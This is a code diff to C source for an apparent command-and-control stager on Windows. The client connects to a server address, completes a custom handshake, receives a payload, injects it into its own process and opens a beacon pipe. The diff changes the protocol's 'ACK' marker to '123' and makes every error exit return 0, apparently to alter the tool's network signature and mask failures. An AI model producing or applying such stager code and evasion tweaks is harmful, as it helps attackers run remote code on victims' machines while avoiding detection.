@@ -173,8 +173,8 @@ int sendData(SOCKET sd, const char* data, DWORD len, int retries) {
 			free(ackpacket);
 			return(-1);
 		}
-		
-		if (*(ackpacket) == 0x41 && *(ackpacket+1) == 0x43 && *(ackpacket+2) == 0x4B) 
+		// Changed ACK to 123
+		if (*(ackpacket) == 0x31 && *(ackpacket+1) == 0x32 && *(ackpacket+2) == 0x33) 
 		{
 			my_seqnum++;
 			break;
@@ -251,7 +251,8 @@ int sendData(SOCKET sd, const char* data, DWORD len, int retries) {
 			}
 			
 			debug_print("contents of ackpacket: %s\n", ackpacket);
-			if (*(ackpacket) == 0x41 && *(ackpacket+1) == 0x43 && *(ackpacket+2) == 0x4B) {
+			// Changed ACK to 123
+			if (*(ackpacket) == 0x31 && *(ackpacket+1) == 0x32 && *(ackpacket+2) == 0x33) {
 				my_seqnum++;
 				remaining = remaining - temp + 4;
 				break;
@@ -322,7 +323,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, int retries) {
 
 		seqnum = *((DWORD*)sizePacket);
 		if (seqnum <= server_seqnum) {
-			iResult = send(sd, "ACK", 4, 0);
+			iResult = send(sd, "123", 4, 0);
 			if (iResult == SOCKET_ERROR)
 			{
 				debug_print("sendto in recvData failed with error %d\n", WSAGetLastError());
@@ -331,7 +332,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, int retries) {
 			}
 			
 			if (seqnum == server_seqnum) {
-				debug_print("%s", "Seqnum matched, sent ACK");
+				debug_print("%s", "Seqnum matched, sent ACK (123)");
 				server_seqnum++;							//Note: under this implementation, there is a limit to the number of packets per connection.
 				size = *((DWORD*)(sizePacket + 4));			//Once the sequence number overflows, this breaks. 
 				break;
@@ -382,7 +383,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, int retries) {
 		debug_print("seqnum: %d\n", seqnum);
 		if (seqnum <= server_seqnum)
 		{
-			iResult = send(sd, "ACK", 4, 0);
+			iResult = send(sd, "123", 4, 0);
 			if (iResult == SOCKET_ERROR)
 			{
 				debug_print("sendto in recvData failed with error %d\n", WSAGetLastError());
@@ -392,7 +393,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, int retries) {
 			}
 			if (seqnum == server_seqnum)
 			{
-				debug_print("%s", "Seqnum matched, sent ACK");
+				debug_print("%s", "Seqnum matched, sent ACK (123)");
 				server_seqnum++;
 				memcpy((buffer + total), (packet + 4), temp - 4);
 				total += temp - 4;
@@ -471,8 +472,8 @@ int threeWayHandshake(SOCKET sd, int retries) {
 		free(synack);
 		return(-1);
 	}
-	iResult = send(sd, "ACK", 4, 0);
-	debug_print("%s", "Sent ACK\n");
+	iResult = send(sd, "123", 4, 0);
+	debug_print("%s", "Sent ACK (123)\n");
 	if (iResult == SOCKET_ERROR)
 	{
 		debug_print("sendto in threeWayHandshake failed with error %d\n", WSAGetLastError());
@@ -533,7 +534,7 @@ void main(int argc, char* argv[])
 	{
 		debug_print("Incorrect number of args: %d\n", argc);
 		debug_print("Incorrect number of args: %s [SERVER_IP] [PORT] [PIPE_STR] [SLEEP] [TIMEOUT] [RETRIES]", argv[0]);
-		exit(1);
+		exit(0);
 	}
 
 	// Disable crash messages
@@ -570,7 +571,7 @@ void main(int argc, char* argv[])
 	if (sockfd == INVALID_SOCKET)
 	{
 		debug_print("%s", "Socket creation error!\n");
-		exit(1);
+		exit(0);
 	}
 	debug_print("%s", "Socket Created\n");
 
@@ -580,7 +581,7 @@ void main(int argc, char* argv[])
 	{
 		debug_print("%s", "threeWayHandshake returned error\n");
 		closesocket(sockfd);
-		exit(1);
+		exit(0);
 	}
 	debug_print("%s", "Handshake completed.\n");
 
@@ -590,7 +591,7 @@ void main(int argc, char* argv[])
 	{
 		debug_print("%s", "payload buffer malloc failed!\n");
 		closesocket(sockfd);
-		exit(1);
+		exit(0);
 	}
 
 	DWORD payload_size = recvData(sockfd, payload, PAYLOAD_MAX_SIZE, RETRIES);
@@ -599,7 +600,7 @@ void main(int argc, char* argv[])
 		debug_print("%s", "recvData error, exiting\n");
 		closesocket(sockfd);
 		free(payload);
-		exit(1);
+		exit(0);
 	}
 	debug_print("Recv %d byte payload from TS\n", payload_size);
 	/* inject the payload stage into the current process */
@@ -628,7 +629,7 @@ void main(int argc, char* argv[])
 		closesocket(sockfd);
 		CloseHandle(beaconPipe);
 		free(payload);
-		exit(1);
+		exit(0);
 	}
 
 	while (1) {
